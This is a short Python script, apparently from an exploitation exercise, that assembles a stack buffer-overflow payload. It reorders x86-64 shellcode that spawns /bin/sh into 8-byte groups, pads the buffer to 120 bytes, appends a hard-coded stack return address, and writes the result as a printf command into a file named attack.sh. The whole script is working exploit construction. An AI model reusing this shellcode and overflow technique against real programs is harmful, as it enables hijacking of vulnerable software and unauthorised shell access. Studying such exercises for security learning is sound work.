shell_code = '\\x6A\\x3B\\x58\\x99\\x52\\x5E\\x48\\xB9\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x52\\x51\\x54\\x5F\\x0F\\x05'
little_endian_address = "\\x60\\xEA\\xFF\\xFF\\xFF\\x7F\""
bytes = shell_code.split('\\')[1:]

words = []
words.append(bytes[0:8][::-1])
words.append(bytes[8:16][::-1])
words.append(['x61', 'x61'] + bytes[16:][::-1])

little_endian_shellcode = ''
for word in words:
    little_endian_shellcode +='\\' + '\\'.join(word)


with open(f"C:\\Users\\trane\\Desktop\\attack.sh", 'w') as f:
        f.write("printf \"" + little_endian_shellcode)
        f.write("\\x61" * (120-24))
        f.write(little_endian_address)
